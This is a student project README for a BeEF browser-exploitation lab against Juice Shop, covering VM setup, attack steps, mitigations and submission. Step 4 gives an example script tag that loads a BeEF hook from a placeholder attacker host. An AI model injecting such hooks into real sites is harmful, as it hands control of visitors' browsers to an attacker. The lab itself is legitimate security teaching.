# Beef_Lab
Final project 
# Browser Exploitation Lab – BeEF + Juice Shop

This repository contains a small lab environment for testing browser-based attacks using BeEF and a vulnerable web app (OWASP Juice Shop or a simple demo page). The goal is to show how an attacker can hook a victim browser and then run client-side exploits in a controlled, ethical way.

The project includes:

- A lab creation guide with steps to rebuild the environment from scratch
- An attack report describing the BeEF attack chain
- A mitigation report with defensive controls and validation
- Screenshots, config samples, and other artifacts used in the lab

---

## 1. Quick Overview

**Attacker:**  
- Kali Linux VM  
- Runs BeEF (Browser Exploitation Framework)  
- Listens on port `3000` for the web UI and `hook.js`

**Victim:**  
- Windows 10/11 machine  
- Uses a web browser (Edge/Chrome/Firefox)  
- Visits a page that loads the BeEF hook script

**Vulnerable surface:**  
- Juice Shop (via Docker) or a custom HTML test page
- Used as the place where the hook script is loaded

Everything runs inside a NAT/virtualized network and is only used for this lab.

---

## 2. Folder Structure

- `lab-creation-guide/`  
  Step-by-step instructions to build the environment, including the network diagram and notes about VM specs and ports.

- `attack-report/`  
  The written attack report plus a simple log file combining terminal output and observations.

- `mitigation-report/`  
  The mitigation write-up explaining which controls would stop the attack and how we tested them.

- `artifacts/`  
  Extra files used in the lab, such as:
  - A redacted copy of the BeEF config
  - Example HTML page that loads the hook
  - A plain text file with version info

- `screenshots/`  
  All screenshots used in the three PDFs, grouped by tool (Juice Shop / BeEF).

---

## 3. How to Rebuild the Lab

High-level steps (details are in `lab-creation-guide/LAB_CREATION_GUIDE.md`):

1. **Set up the VMs**
   - Create a Kali VM and a Windows VM on the same virtual network (NAT or host-only).
   - Note their IP addresses (Kali will be used as the BeEF server).

2. **Install and start BeEF on Kali**
   - Install `beef-xss` from the package manager.
   - Start the BeEF service and open the UI on `http://127.0.0.1:3000/ui/panel`.
   - Log in using the configured credentials.

3. **Deploy Juice Shop (or a test page)**
   - Run Juice Shop in Docker, or host a simple HTML page on the Windows machine or another VM.
   - Confirm the page is reachable from the victim browser.

4. **Inject the hook**
   - Add the hook script tag pointing to the Kali IP and BeEF port, for example:  
     ```html
     <script src="http://KALI-IP:3000/hook.js"></script>
     ```
   - Load that page in the Windows browser.
   - Verify the browser appears as “Online” in the BeEF UI.

5. **Run BeEF modules**
   - Use simple, visible modules:
     - Raw JavaScript alert
     - BlockUI popup
     - Fake notification bar
     - Redirect browser
   - Capture screenshots of the commands and their effects.

6. **Apply mitigations (optional for rebuild)**
   - Add a Content Security Policy, outbound firewall rules, or script-blocking tools.
   - Try to repeat the attack and confirm it no longer works.

---

## 4. How to Use This Repo

- Use `lab-creation-guide/LAB_CREATION_GUIDE.md` as your main setup document.
- Use `attack-report/ATTACK_REPORT.md` and `mitigation-report/MITIGATION_REPORT.md` as the source files for your final PDFs.
- Place screenshots under `screenshots/` and reference them by filename in the reports.
- Keep any real credentials out of the repo. If you include config files, redact passwords and tokens.

---

## 5. Versioning and Submission

For submission, create a tagged release:

1. Commit all changed files.
2. Push to GitHub.
3. Create a tag like `v1.0-submission`.
4. Use that release URL as the link you submit to the LMS.

You can continue to make changes later with new tags (for example `v1.1` for improvements), but the tagged release matches the version handed in for grading.
